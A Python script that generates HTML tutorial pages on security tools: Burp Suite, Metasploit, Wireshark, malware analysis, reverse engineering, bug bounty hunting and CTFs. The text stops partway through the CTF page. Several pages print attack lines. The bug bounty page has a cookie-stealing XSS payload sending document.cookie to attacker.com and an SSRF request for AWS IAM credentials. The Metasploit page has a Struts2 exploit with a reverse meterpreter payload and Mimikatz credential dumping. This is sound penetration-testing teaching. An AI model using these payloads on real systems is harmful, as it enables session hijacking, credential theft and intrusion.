#!/usr/bin/env python3
"""Generate tutorials 26-60 (part 2) — Security, DevOps, Databases, Data Science."""
import os
from tutorial_helpers import build_page, write_page, TUTS


def generate_part2():
    # ------------------------------------------------------------------------
    # SECURITY (10)
    # ------------------------------------------------------------------------

    build_page(
        title="Burp Suite Web Testing",
        filename="burp-suite.html",
        desc="Learn how to use Burp Suite for web application security testing — from intercepting traffic to automated scanning.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("Intercepting Proxy",
             "<p>Burp Suite's intercepting proxy is the cornerstone of manual web testing. It sits between your browser and the target server, allowing you to inspect and modify every HTTP request and response in real time. To set it up, configure your browser to use Burp's proxy listener (typically <code>127.0.0.1:8080</code>) and install Burp's CA certificate to intercept HTTPS traffic without SSL errors.</p>"
             "<p>The proxy tab shows a live log of all requests passing through. You can enable interception to pause traffic, edit request headers, modify parameters, and forward crafted payloads. This is invaluable for testing parameter tampering, SQL injection points, and authorization bypasses. Use <code>Proxy > Options</code> to configure rules like URL-specific interception or auto-modification of certain headers.</p>"
             "<p>Key features of the proxy module include:</p>"
             "<ul>"
             "<li><strong>Intercept toggle</strong> — forward or drop individual requests</li>"
             "<li><strong>HTTP history</strong> — searchable log of all proxied traffic</li>"
             "<li><strong>WebSocket history</strong> — inspect WebSocket frames in real time</li>"
             "<li><strong>Match and Replace</strong> — auto-modify headers or bodies</li>"
             "</ul>"),
            ("Scanner",
             "<p>Burp Scanner automates vulnerability detection across web applications. It combines passive scanning (analyzing traffic without sending requests) with active scanning (sending crafted payloads to probe for flaws). The scanner checks for over 100 categories of vulnerabilities including SQL injection, XSS, SSRF, XXE, and command injection.</p>"
             "<p>To run a scan, right-click any request in the proxy history or site map and select <code>Do an active scan</code>. Burp will crawl the target, fuzz inputs, and correlate findings. The <strong>scan queue</strong> shows live progress with categorized findings. Each issue includes a severity rating (High, Medium, Low, Info), a detailed description, and remediation advice.</p>"
             "<pre><code># Example: Burp Scanner detected SQL injection\n# Vulnerable parameter: id\n# Payload: 1' OR '1'='1\n# Evidence: UNION-based error in response\n# Remediation: Use parameterized queries</code></pre>"),
            ("Intruder",
             "<p>Burp Intruder is a powerful fuzzing tool for automated parameter testing. It takes a base request, marks payload positions (e.g., <code>&id=§1§</code>), and substitutes values from a payload set. This enables brute-force attacks, dictionary-based fuzzing, and enumeration tasks.</p>"
             "<p>Configure Intruder in four steps: (1) send a request to Intruder via right-click, (2) define payload positions with the <code>§</code> delimiters, (3) choose a payload type (simple list, numbers, brute-forcer, etc.), and (4) configure attack settings like throttling and grep matching. The results table shows each request's status, length, and timing — anomalies often indicate security flaws.</p>"
             "<p>Common Intruder use cases include directory brute-forcing, password spraying, session token analysis, API parameter fuzzing, and rate-limit testing. Use <strong>Grep-Match</strong> to highlight responses containing specific strings (like \"error\" or \"invalid\").</p>"),
            ("Repeater",
             "<p>The Repeater tool lets you manually resend individual HTTP requests with fine-grained control. Unlike Intruder (which sends many requests in parallel), Repeater is designed for iterative exploration — tweak a parameter, send, examine the response, and adjust.</p>"
             "<p>Right-click any request in Burp and choose <code>Send to Repeater</code> (or press <code>Ctrl+R</code>). The interface splits into request (top) and response (bottom) panes. You can edit headers, cookies, POST bodies, and query parameters between requests. The <strong>history</strong> panel lets you revisit previous versions and compare responses side-by-side.</p>"
             "<p>Repeater is ideal for testing race conditions, debugging authentication flows, chaining multiple vulnerabilities, and verifying scanner findings manually. Use the <strong>pretty/raw/hex</strong> views to inspect responses in different formats.</p>"),
            ("Extensions and BApp Store",
             "<p>Burp's functionality extends through the BApp Store — a marketplace of community and professional extensions. Popular extensions include <strong>Autorize</strong> (for authorization testing), <strong>Logger++</strong> (advanced traffic logging), <strong>Turbo Intruder</strong> (high-speed HTTP fuzzing), and <strong>JSON Web Tokens</strong> (JWT analysis and attacks).</p>"
             "<p>Install extensions via the <code>Extender</code> tab. You can also write your own using Burp's Java, Python (Jython), or Ruby (JRuby) APIs. The <code>IBurpExtender</code> interface provides hooks for request/response interception, scan checks, and UI customization. Extensions run in the same JVM and have full access to Burp's data model.</p>"
             "<pre><code># Python example: Burp extension skeleton\n# Using Jython 2.7\nfrom burp import IBurpExtender\n\nclass BurpExtender(IBurpExtender):\n    def registerExtenderCallbacks(self, callbacks):\n        self._callbacks = callbacks\n        callbacks.setExtensionName(\"My Extension\")\n        callbacks.registerHttpListener(self)</code></pre>"),
        ],
        further=[
            ("Burp Suite Documentation", "Official PortSwigger documentation covering all Burp features.", "https://portswigger.net/burp/documentation"),
            ("Web Security Academy", "Free hands-on labs for web security testing with Burp Suite.", "https://portswigger.net/web-security"),
            ("Burp Extensions Guide", "Community-maintained list of Burp extensions and how to build your own.", "https://portswigger.net/bappstore"),
        ],
    )

    build_page(
        title="Metasploit Framework Basics",
        filename="metasploit-basics.html",
        desc="Get started with Metasploit — the most widely used exploitation framework for penetration testing and red team operations.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("Framework Overview",
             "<p>Metasploit is an open-source exploitation framework developed by Rapid7. It provides a complete environment for writing, testing, and executing exploit code against remote targets. The framework consists of hundreds of modules organized into exploits, payloads, encoders, nops, and post-exploitation tools. It runs on Linux (preferred), macOS, and Windows.</p>"
             "<p>Launch the console with <code>msfconsole</code>. This interactive shell gives you access to all framework commands. The <code>help</code> command lists available modules and categories. Core commands include <code>search</code> (find modules), <code>use</code> (select a module), <code>show options</code> (view configurable parameters), <code>set</code> (assign a value), and <code>run</code>/<code>exploit</code> (execute the module).</p>"
             "<ul>"
             "<li><code>msfconsole</code> — main command-line interface</li>"
             "<li><code>msfdb init</code> — initialize the backend database for workspace management</li>"
             "<li><code>workspace -a &lt;name&gt;</code> — create isolated workspaces per engagement</li>"
             "</ul>"),
            ("Modules Architecture",
             "<p>Metasploit modules follow a standardized directory structure. The <strong>exploit</strong> module delivers the attack payload to a target. <strong>Payload</strong> modules define what runs on the compromised system (reverse shell, meterpreter, bind shell, etc.). <strong>Auxiliary</strong> modules perform scanning, fuzzing, and information gathering without exploitation. <strong>Post</strong> modules handle post-exploitation tasks like privilege escalation and credential dumping.</p>"
             "<p>Each module has configurable options: <code>RHOSTS</code> (target IP), <code>RPORT</code> (target port), <code>TARGET</code> (specific platform/version), and <code>PAYLOAD</code> (what to execute). Use the <code>info</code> command to view module details, references, and disclosure dates. The <code>check</code> command tests if a target is vulnerable without exploiting it.</p>"
             "<pre><code>msf6 > use exploit/multi/http/struts2_content_type_ognl\nmsf6 > set RHOSTS 192.168.1.105\nmsf6 > set TARGET 0\nmsf6 > set PAYLOAD linux/x64/meterpreter/reverse_tcp\nmsf6 > set LHOST 10.0.0.5\nmsf6 > exploit</code></pre>"),
            ("Meterpreter Payloads",
             "<p>Meterpreter is Metasploit's advanced payload that operates entirely in memory (fileless). It provides a rich command set for post-exploitation without touching disk. After a successful exploit, you get a Meterpreter shell — an interactive environment for running commands on the target.</p>"
             "<p>Key Meterpreter commands include <code>sysinfo</code> (OS and architecture), <code>getuid</code> (current user), <code>ps</code> (process listing), <code>migrate</code> (move to another process), <code>hashdump</code> (dump password hashes), and <code>shell</code> (drop into a system command shell). The <code>background</code> command sends the session to the background, letting you run other modules while keeping the session alive.</p>"
             "<ul>"
             "<li><code>sysinfo</code> — OS version, architecture, computer name</li>"
             "<li><code>search -f *.txt</code> — search for files matching a pattern</li>"
             "<li><code>upload /tmp/script.sh</code> — upload files to the target</li>"
             "<li><code>load kiwi</code> — load Mimikatz for credential harvesting</li>"
             "</ul>"),
            ("Post-Exploitation",
             "<p>After gaining a foothold, Metasploit post-exploitation modules help you pivot, escalate privileges, and extract data. The <code>post/</code> directory contains modules organized by category: <code>windows/gather/</code>, <code>linux/gather/</code>, and <code>multi/manage/</code>.</p>"
             "<p>Common post-exploitation workflows include running <code>post/multi/recon/local_exploit_suggester</code> to find privilege escalation vectors, using <code>kiwi</code> (Mimikatz) on Windows to extract plaintext credentials, and setting up routing through compromised hosts to reach internal networks with <code>route add</code>. Always document findings with timestamps and screenshots for reporting.</p>"
             "<pre><code># Run exploit suggester on active session\nmsf6 > use post/multi/recon/local_exploit_suggester\nmsf6 > set SESSION 1\nmsf6 > run\n\n# Pivot through compromised host\nmsf6 > route add 10.0.0.0/24 1</code></pre>"),
            ("Database and Workspace Management",
             "<p>Metasploit integrates with a PostgreSQL database to store scan results, credentials, and session data. Initialize the database with <code>msfdb init</code>. Workspaces keep engagements isolated — use <code>workspace -a &lt;name&gt;</code> to create one, <code>workspace &lt;name&gt;</code> to switch, and <code>workspace -d &lt;name&gt;</code> to delete.</p>"
             "<p>Database-backed commands include <code>db_nmap</code> (run Nmap and store results), <code>hosts</code> (list discovered hosts), <code>services</code> (list open ports), <code>vulns</code> (list vulnerabilities), <code>creds</code> (list captured credentials), and <code>loot</code> (list downloaded files). This structured storage makes it easy to generate engagement reports with <code>pro_workspace_generate_report</code>.</p>"
             "<p>Regularly back up your MSF database with <code>msfdb export</code> and use <code>resource</code> scripts to automate repetitive tasks across engagements.</p>"),
        ],
        further=[
            ("Metasploit Documentation", "Official Rapid7 documentation covering installation, modules, and advanced usage.", "https://docs.metasploit.com/"),
            ("Offensive Security Training", "Practical penetration testing courses built around Metasploit.", "https://www.offsec.com/courses/pen-200/"),
            ("Metasploit Unleashed", "Free online guide to Metasploit from Offensive Security.", "https://www.offensive-security.com/metasploit-unleashed/"),
        ],
    )

    build_page(
        title="Wireshark Deep Dive",
        filename="wireshark-deep-dive.html",
        desc="Master network packet analysis with Wireshark — capture filters, display filters, protocol dissection, and traffic forensics.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("Capture Filters",
             "<p>Capture filters in Wireshark use the Berkeley Packet Filter (BPF) syntax to decide which packets are recorded at the kernel level. Setting the right capture filter reduces file size and eliminates noise before analysis begins. Capture filters are applied before packets are collected and cannot be changed after the capture starts.</p>"
             "<p>Common BPF expressions include <code>host 10.0.0.1</code> (traffic to/from a specific IP), <code>tcp port 80</code> (only HTTP traffic), <code>not arp</code> (exclude ARP broadcasts), and <code>src net 192.168.0.0/16</code> (traffic from a subnet). Compound filters use <code>and</code>, <code>or</code>, and <code>not</code> operators. For example: <code>tcp port 443 and host 10.0.0.1</code> captures HTTPS traffic to a specific server.</p>"
             "<pre><code># Capture only DNS traffic\nport 53\n\n# Capture HTTP and HTTPS excluding local broadcast\ntcp port 80 or tcp port 443 and not broadcast\n\n# Capture traffic for a specific TCP stream\nhost 192.168.1.100 and tcp port 8080</code></pre>"),
            ("Display Filters",
             "<p>Display filters are far more powerful than capture filters — they operate on already-captured data and support thousands of protocol fields. The filter bar (green when valid, red when invalid) accepts expressions like <code>http.request.method == \"POST\"</code> or <code>ip.src == 10.0.0.1 and tcp.port == 443</code>. Wireshark provides autocompletion as you type.</p>"
             "<p>Advanced display filter techniques include comparing fields (<code>frame.time_delta &gt; 0.5</code> for time gaps), matching strings (<code>http.host contains \"example\"</code>), and tracking TCP conversations (<code>tcp.stream eq 0</code>). Use the <strong>Expression Builder</strong> (button next to the filter bar) to browse all 200,000+ filterable fields organized by protocol.</p>"
             "<ul>"
             "<li><code>tcp.analysis.flags</code> — highlight TCP anomalies (retransmissions, dup ACKs)</li>"
             "<li><code>dns.qry.name ~= \".*\\\\.com$\"</code> — regex matching on DNS queries</li>"
             "<li><code>http.response.code &gt;= 400</code> — filter for HTTP errors</li>"
             "<li><code>tls.handshake.type == 1</code> — show TLS Client Hello packets</li>"
             "</ul>"),
            ("Protocol Analysis",
             "<p>Wireshark decodes hundreds of protocols via its dissection engine. The packet details pane shows each layer (Ethernet, IP, TCP, Application) with expandable fields. For HTTP, you can Follow TCP Stream (<code>Right-click > Follow > TCP Stream</code>) to reconstruct the full conversation — useful for extracting files or understanding API calls.</p>"
             "<p>The <strong>Statistics</strong> menu provides protocol hierarchy charts, conversation lists, and IO graphs. <code>Statistics > Protocol Hierarchy</code> shows bandwidth distribution across protocols. <code>Statistics > IO Graph</code> helps identify traffic bursts. For VoIP analysis, <code>Telephony > VoIP Calls</code> reconstructs SIP and RTP streams with playable audio.</p>"
             "<p>Use colored rules (<code>View > Coloring Rules</code>) to visually distinguish protocols. Default rules color DNS blue, TCP RST red, and ICMP purple. Custom rules can tag specific ports, IP ranges, or application protocols for rapid visual scanning.</p>"),
            ("Network Forensics",
             "<p>Wireshark is an essential tool for network forensics and incident response. When investigating a breach, start by identifying the time frame of suspicious activity using IO graphs. Look for DNS exfiltration patterns (frequent, small DNS queries to unknown domains), beaconing traffic (regular HTTP requests to a C2 server), and large data transfers outside business hours.</p>"
             "<p>The <strong>Expert Information</strong> dialog (<code>Analyze > Expert Information</code>) automatically flags anomalies — retransmissions, zero windows, and malformed packets. Export objects via <code>File > Export Objects > HTTP/SMB/TFTP</code> to extract transferred files. Use <code>tshark</code> (the command-line version) for batch processing of large PCAP files in forensic workflows.</p>"
             "<pre><code># tshark examples for forensics\n# Export HTTP objects\ntshark -r capture.pcap --export-objects http,/tmp/export\n\n# List all unique IP conversations\ntshark -r capture.pcap -T fields -e ip.src -e ip.dst | sort | uniq -c | sort -rn\n\n# Find TLS certificates\ntshark -r capture.pcap -Y \"tls.handshake.certificate\" -V</code></pre>"),
        ],
        further=[
            ("Wireshark User Guide", "Official user manual covering all Wireshark features in depth.", "https://www.wireshark.org/docs/wsug_html_chunked/"),
            ("Wireshark Display Filters", "Complete reference of display filter expressions and examples.", "https://www.wireshark.org/docs/dfref/"),
            ("Chris Sanders TCP Analysis", "Practical book and blog series on TCP/IP analysis with Wireshark.", "https://www.chrissanders.org/"),
        ],
    )

    build_page(
        title="Malware Analysis Introduction",
        filename="malware-analysis-intro.html",
        desc="Learn the fundamentals of malware analysis — static and dynamic techniques, sandboxing, and reverse engineering workflows.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("Static Analysis",
             "<p>Static analysis examines malware without executing it. Analysts inspect file metadata, strings, imports, and structure to gather initial intelligence. Tools like <code>file</code>, <code>strings</code>, and <code>PEview</code> provide quick insights. The <code>file</code> command identifies the binary type (PE, ELF, Mach-O). <code>strings -n 8 malware.exe</code> extracts printable strings longer than 8 characters — look for URLs, IP addresses, registry keys, and file paths.</p>"
             "<p>PE (Portable Executable) structure analysis reveals imports (<code>kernel32.dll</code> functions like <code>CreateRemoteThread</code> suggest injection), sections (abnormal section names or sizes), and compilation timestamps. Tools like <code>pefile</code> (Python library) and <code>Detect It Easy</code> identify packers and compilers. Check the hash (<code>sha256sum</code>) against VirusTotal to see if the sample is known.</p>"
             "<ul>"
             "<li><code>strings</code> — extract readable text from binaries</li>"
             "<li><code>pefile</code> — parse and analyze PE headers programmatically</li>"
             "<li><code>capa</code> — detect malware capabilities from static analysis</li>"
             "<li><code>floss</code> — extract obfuscated strings using FLOSS</li>"
             "</ul>"),
            ("Dynamic Analysis",
             "<p>Dynamic analysis runs the malware in a controlled environment to observe its behavior. Set up an isolated VM with <code>INetSim</code> (fake internet services), <code>Process Monitor</code> (registry/file activity), <code>Wireshark</code> (network traffic), and <code>API Monitor</code> (function calls). Snapshot the VM before each run for easy restoration.</p>"
             "<p>Monitor process creation — malware often spawns <code>cmd.exe</code>, <code>powershell.exe</code>, or <code>rundll32.exe</code>. Watch for file creation in startup folders, <code>AppData</code>, or <code>Temp</code>. Use <code>Process Hacker</code> to inspect handles, threads, and loaded DLLs. Log all network connections — check for DNS lookups to DGA domains, HTTP POST exfiltration, or IRC commands.</p>"
             "<pre><code># INetSim simulation setup\nsudo inetsim\n# Reports generated in /var/log/inetsim/report/\n\n# Capture network traffic during analysis\nsudo tcpdump -i eth0 -w analysis.pcap\n\n# Monitor file changes\ninotifywait -m -r /tmp /Users/</code></pre>"),
            ("Sandboxing",
             "<p>Automated sandboxes provide a first-pass analysis by running samples in instrumented environments. Popular sandboxes include <strong>Cuckoo</strong> (open-source, modular), <strong>Joe Sandbox</strong> (commercial, deep analysis), and <strong>Any.Run</strong> (interactive cloud sandbox). They generate reports covering API calls, network traffic, file modifications, and process trees.</p>"
             "<p>Cuckoo Sandbox is the industry standard for open-source automated analysis. It uses a host agent (Windows/Linux) and a custom kernel driver to capture API calls. Submit a sample via the web interface or command line: <code>cuckoo submit malware.exe</code>. The report (JSON/HTML) includes signatures, behavioral graphs, and PCAP downloads. Malware often detects sandboxes by checking for analysis tools, small screen resolutions, or short uptimes.</p>"
             "<p>Evasion techniques include:</p>"
             "<ul>"
             "<li><strong>Virtual machine detection</strong> — check for VMWare/VirtualBox artifacts</li>"
             "<li><strong>Sleep loops</strong> — delay execution beyond sandbox time limits</li>"
             "<li><strong>Anti-debugging</strong> — <code>IsDebuggerPresent()</code> or <code>NtGlobalFlag</code> checks</li>"
             "<li><strong>Environment checks</strong> — verify user input, mouse movements, installed software</li>"
             "</ul>"),
            ("Analyzing Packers and Obfuscation",
             "<p>Many malware samples are packed to compress and obfuscate the original code. Packers like UPX, Themida, and VMProtect decrypt the real code in memory at runtime. Detect packers with <code>Detect It Easy</code> or by analyzing entropy — packed binaries have high entropy across sections. Use <code>PEiD</code> (deprecated but still useful) or <code>Exeinfo PE</code> for signature-based packer detection.</p>"
             "<p>For UPX-packed binaries, simply unpack with <code>upx -d malware.exe</code>. Custom packers require manual unpacking: set a breakpoint after the unpacking stub (typically at the OEP — Original Entry Point) and dump the process memory with <code>Scylla</code> or <code>LordPE</code>. Tools like <code>x64dbg</code> have built-in unpacking plugins for common packer patterns.</p>"
             "<pre><code># UPX unpacking\nupx -d packed.exe -o unpacked.exe\n\n# Detect packers with py -m pefile\npython3 -c \"import pefile; pe = pefile.PE('sample.exe'); print(f'Sections: {len(pe.sections)}')\"</code></pre>"),
        ],
        further=[
            ("Practical Malware Analysis", "The definitive book on malware analysis — covers static, dynamic, and memory forensics.", "https://practicalmalwareanalysis.com/"),
            ("The Zoo Malware Repository", "Curated collection of live malware samples for analysis practice.", "https://github.com/ytisf/theZoo"),
            ("Cuckoo Sandbox Documentation", "Official documentation for the open-source automated malware analysis system.", "https://cuckoo.sh/docs/"),
        ],
    )

    build_page(
        title="Reverse Engineering Basics",
        filename="reverse-engineering-basics.html",
        desc="Understand the core techniques of reverse engineering — disassembly, debugging, decompilation, and binary patching with industry tools.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("Disassembly Fundamentals",
             "<p>Disassembly translates machine code back into assembly language (x86, x64, ARM). The goal is to understand what a binary does without source code. Two main disassemblers dominate the field: <strong>IDA Pro</strong> (commercial, feature-rich) and <strong>Ghidra</strong> (free, open-source from NSA). Both produce control flow graphs (CFGs) showing function boundaries, branches, and calls.</p>"
             "<p>Assembly concepts critical for reverse engineering include the stack (function arguments via <code>push</code>/<code>pop</code>, local variables via <code>sub esp, N</code>), calling conventions (<code>stdcall</code>, <code>cdecl</code>, <code>fastcall</code>), and the <code>EFLAGS</code> register (comparisons and jumps). A common pattern is function prologue (<code>push ebp; mov ebp, esp</code>) and epilogue (<code>leave; ret</code>).</p>"
             "<pre><code>; x86 function prologue example\npush    ebp\nmov     ebp, esp\nsub     esp, 0x10      ; allocate 16 bytes for locals\n; ... function body ...\nleave                   ; mov esp,ebp; pop ebp\nretn</code></pre>"),
            ("Debugging Techniques",
             "<p>Dynamic analysis with a debugger lets you step through code, inspect memory, and modify execution in real time. <strong>x64dbg</strong> (Windows) and <strong>GDB</strong> (Linux) are the primary tools. Set breakpoints (<code>F2</code> in x64dbg, <code>b *0x401000</code> in GDB), step over (<code>F8</code>), step into (<code>F7</code>), and examine registers and memory.</p>"
             "<p>Key debugging workflows include tracing API calls to understand I/O, locating string references to find validation logic, and modifying jump conditions to bypass checks. The <strong>Watch</strong> window tracks expression values. Use <strong>Memory Map</strong> to see PE sections and permissions — a section marked RWX (read-write-execute) often indicates unpacked code or injected payloads.</p>"
             "<ul>"
             "<li><strong>Hardware breakpoints</strong> — persist across memory modifications</li>"
             "<li><strong>Conditional breakpoints</strong> — trigger when register/memory equals a value</li>"
             "<li><strong>Trace recording</strong> — log every instruction executed for later analysis</li>"
             "</ul>"),
            ("IDA Pro and Ghidra",
             "<p><strong>IDA Pro</strong> is the gold standard for static reverse engineering. Its decompiler (<strong>Hex-Rays</strong>) produces C-like pseudocode from assembly, dramatically speeding up analysis. IDA auto-detects library functions (FLIRT signatures), renames variables via <code>N</code>, and lets you add comments (<code>; key</code>). The <strong>Graph View</strong> shows color-coded CFGs — red for jump blocks, green for loops.</p>"
             "<p><strong>Ghidra</strong> (NSA's free alternative) offers similar functionality with a built-in decompiler. Ghidra's strengths include its extensible plugin architecture (Python/Java), collaborative analysis via Ghidra Server, and version tracking for binary diffing. Ghidra uses a project-based model — create a project, import the binary, and run auto-analysis. The Listing window shows combined disassembly and decompiler output side-by-side.</p>"
             "<pre><code># Ghidra headless analysis\n./support/analyzeHeadless /tmp/project MyProject \\\n    -import /tmp/malware.exe \\\n    -postScript HelloWorldScript.py</code></pre>"),
            ("Patching and Modification",
             "<p>Sometimes you need to modify a binary — patching jump conditions, editing strings, or removing anti-debugging checks. In <strong>x64dbg</strong>, right-click an instruction and select <code>Assemble</code> to replace it (e.g., change <code>JNZ</code> to <code>JZ</code>). Right-click the modified area and <code>Copy to executable > Selection</code> to save the patched binary.</p>"
             "<p>For static patching, use a hex editor like <strong>HxD</strong> or <strong>010 Editor</strong>. Common patches include replacing a conditional jump with <code>NOP</code> (0x90) slides to disable checks, or changing <code>JE</code> (0x74) to <code>JMP</code> (0xEB) to always take a branch. Validate patches by comparing SHA-256 hashes: <code>sha256sum original.exe patched.exe</code>.</p>"
             "<p>Always patch on a copy, not the original binary. Document each change with offsets and original bytes for reproducibility.</p>"),
        ],
        further=[
            ("Ghidra Book", "The official guide to reverse engineering with Ghidra — covers program analysis, scripting, and extensions.", "https://ghidra-sre.org/"),
            ("x64dbg Blog", "Tutorials and updates for the x64dbg debugger.", "https://x64dbg.com/blog/"),
            ("Reverse Engineering Stack Exchange", "Community Q&A covering obfuscation, packers, and advanced RE techniques.", "https://reverseengineering.stackexchange.com/"),
        ],
    )

    build_page(
        title="Bug Bounty Hunting Guide",
        filename="bug-bounty-guide.html",
        desc="A practical roadmap to bug bounty hunting — reconnaissance, vulnerability research, weaponization, and responsible disclosure.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("Reconnaissance",
             "<p>Reconnaissance (recon) is the foundation of every successful bug bounty hunt. Before testing, gather as much information as possible about the target's attack surface. Start with passive recon — use <code>Subfinder</code> and <code>Amass</code> to enumerate subdomains, <code>httpx</code> to probe live hosts, and <code>Wayback Machine</code> (via <code>gau</code>) to find historical endpoints and parameters.</p>"
             "<p>Active recon tools like <code>ffuf</code> (directory brute-forcing), <code>nmap</code> (port scanning), and <code>Aquatone</code> (screenshot gathering) reveal hidden attack vectors. Check for exposed <code>robots.txt</code>, <code>sitemap.xml</code>, and source code comments. Use <code>Shodan</code> and <code>Censys</code> to discover exposed services. Build a wordlist specific to the target — combine technology names, developer handles, and product terms.</p>"
             "<pre><code># Subdomain enumeration with subfinder\nsubfinder -d target.com -all -o subdomains.txt\n\n# Probe live hosts\ncat subdomains.txt | httpx -status-code -title -o live.txt\n\n# Find archived endpoints\ngau --subs target.com | grep -E \"\\\\?.*=\" | anew params.txt</code></pre>"),
            ("Vulnerability Research",
             "<p>Bug bounty hunters specialize in specific vulnerability classes. Common high-impact findings include <strong>IDOR</strong> (Insecure Direct Object Reference), <strong>XSS</strong> (Cross-Site Scripting), <strong>SQL injection</strong>, <strong>SSRF</strong> (Server-Side Request Forgery), <strong>SSTI</strong> (Server-Side Template Injection), and <strong>Authentication bypasses</strong>. Each requires specific detection techniques and payloads.</p>"
             "<p>For IDORs, iterate over sequential IDs in API endpoints (<code>/api/users/1</code> → <code>/api/users/2</code>) and check for unauthorized access. For XSS, test input fields with simple payloads like <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> and observe if they're sanitized. Use <code>Burp Suite</code>'s Intruder with a wordlist of SSRF payloads targeting <code>file:///</code>, <code>http://169.254.169.254/</code> (AWS metadata), and <code>http://localhost/</code>.</p>"
             "<ul>"
             "<li><strong>IDOR</strong> — change IDs in URL/body, check for horizontal/vertical escalation</li>"
             "<li><strong>Open Redirect</strong> — test <code>?url=//evil.com</code> in redirect endpoints</li>"
             "<li><strong>Rate limiting</strong> — check if brute-force protection exists on login/OTP</li>"
             "<li><strong>JWT attacks</strong> — set <code>alg: none</code>, tamper payload, check expiry</li>"
             "</ul>"),
            ("Weaponization and Exploitation",
             "<p>Once you find a vulnerability, weaponize it to demonstrate impact. For stored XSS, craft a payload that exfiltrates cookies or session tokens to a controlled server (<code>Burp Collaborator</code> or a VPS). For SSRF, attempt to read cloud metadata or reach internal services. For SQL injection, use <code>sqlmap</code> to automate database extraction: <code>sqlmap -u \"http://target.com/page?id=1\" --batch --dbs</code>.</p>"
             "<p>Always escalate the impact — a self-XSS combined with CSRF becomes stored XSS. A file upload with path traversal becomes RCE. Document your PoC with request/response pairs, screenshots, and a clear description of the business risk. Many programs reward higher bounties for chained vulnerabilities that demonstrate critical impact.</p>"
             "<pre><code># Basic SQLi detection with sqlmap\nsqlmap -u \"https://target.com/product?id=5\" --level 3 --risk 2\n\n# XSS payload for cookie stealing\n<script>fetch('https://attacker.com/steal?c='+document.cookie)</script>\n\n# SSRF to AWS metadata endpoint\ncurl -v \"https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/\"</code></pre>"),
            ("Reporting and Disclosure",
             "<p>A well-written report is as important as the finding itself. Structure your report with (1) a brief summary, (2) steps to reproduce with exact HTTP requests, (3) a proof-of-concept (screenshot or video), (4) impact assessment, and (5) remediation suggestion. Use platform templates (HackerOne, Bugcrowd, Intigriti) to ensure completeness.</p>"
             "<p>Common reporting mistakes include vague reproduction steps, missing context, suggesting wrong remediation, and failing to check for duplicates. Use <code>retry</code> with long timeouts for time-sensitive bugs. Follow the program's disclosure policy — some require 90-day embargo before public disclosure. Good communication with triagers increases acceptance rates and may earn bonuses.</p>"
             "<p>Track your submissions with a spreadsheet: program name, vulnerability type, date submitted, status, bounty amount, and payout date. This helps identify which programs and techniques yield the best returns.</p>"),
        ],
        further=[
            ("HackerOne Hacktivity", "Live feed of publicly disclosed bug bounty reports with detailed writeups.", "https://hackerone.com/hacktivity"),
            ("PortSwigger Research", "Cutting-edge web security research papers and tool releases.", "https://portswigger.net/research"),
            ("Bugcrowd University", "Free training materials for aspiring bug bounty hunters.", "https://www.bugcrowd.com/bugcrowd-university/"),
            ("PayloadsAllTheThings", "Community-curated list of payloads and bypass techniques.", "https://github.com/swisskyrepo/PayloadsAllTheThings"),
        ],
    )

    build_page(
        title="Capture The Flag Guide",
        filename="ctf-guide.html",
        desc="Everything you need to know about Capture The Flag competitions — categories, essential tools, strategies, and practice platforms.",
        badge="Security",
        icon="fas fa-shield-alt",
        sections=[
            ("CTF Categories",
             "<p>CTF challenges span multiple categories that test different aspects of security knowledge. <strong>Cryptography</strong> involves breaking ciphers, exploiting weak randomness, and implementing attacks like padding oracle or hash length extension. <strong>Web exploitation</strong> challenges mirror real-world bugs — SQLi, XSS, SSTI, SSRF, and file inclusion. <strong>Reverse engineering</strong> tasks provide binaries that must be analyzed to reveal flags hidden in code or bypassed protection.</p>"
             "<p><strong>Binary exploitation (pwn)</strong> challenges require writing shellcode, exploiting buffer overflows, ROP chains, and format string vulnerabilities. <strong>Forensics</strong> tasks provide PCAP files, disk images, or memory dumps — use tools like <code>volatility</code>, <code>binwalk</code>, and <code>tshark</code>. <strong>OSINT</strong> challenges involve researching public information — social media, Google dorks, image metadata. <strong>Misc</strong> covers everything else: steganography, logic puzzles, programming challenges.</p>"
             "<ul>"
             "<li>Crypto — RSA, AES, XOR, hash length extension, padding oracle</li>"
             "<li>Web — LFI/RFI, SQLi, SSTI, JWT manipulation, deserialization</li>"
             "<li>Rev — UPX unpacking, anti-debug, VM-based challenges, flag encryption</li>"
             "<li>Pwn — stack overflow, heap exploitation, ROP, seccomp bypass</li>"
             "</ul>"),
            ("Essential Tools",
             "<p>A well-prepared CTF toolkit separates efficient players from the rest. For cryptography, have <code>Python</code> with <code>pycryptodome</code>, <code>SageMath</code> for number theory, and <code>xortool</code> for XOR analysis. Web challenges require <code>Burp Suite</code> (or <code>OWASP ZAP</code>), <code>sqlmap</code>, <code>ffuf</code>, and <code>curl</code>. Reverse engineering needs <code>Ghidra</code>/<code>IDA Free</code>, <code>x64dbg</code>, <code>GDB</code> with <code>pwndbg</code> or <code>gef</code>, and <code>radare2</code>.</p>"
             "<p>Binary exploitation relies on <code>pwntools</code> (Python library for exploit development), <code>checksec</code> (binary security properties), <code>one_gadget</code> (libc gadget finder), and <code>ROPgadget</code>. Forensics tool belt includes <code>Volatility 3</code> (memory analysis), <code>Autopsy</code> (disk forensics), <code>pstools</code>, and <code>steghide</code> (steganography). Dockerize your environment with <code>kalilinux</code> or <code>ctf-tools</code> Docker images for portability.</p>"
             "<pre><code># pwntools skeleton for binary exploitation\nfrom pwn import *\nelf = ELF('./challenge')\nrop = ROP(elf)\np = process('./challenge')\np.sendline(flat('A'*40, elf.symbols['win']))\np.interactive()</code></pre>"),
            ("Strategies and Teamwork",
             "<p>CTFs are both individual skill tests and team competitions. Divide categories among team members based on strengths — assign pwn to the binary expert, web to the developer, and crypto to the mathematician. Use a shared communication channel (Discord/Slack) to avoid duplicate work. Document solved challenges in a shared notes document to build an internal knowledge base.</p>"
             "<p>Time management is critical. Read all challenges first (the <strong>challenge triage</strong> phase), flag easy solves, then allocate deep-work time for hard challenges. Use the <strong>difficulty rating</strong> (usually indicated by solve count) — solve the high-solve-count challenges first. If stuck on a challenge for more than 2 hours, ask teammates for fresh eyes or move on and return later.</p>"
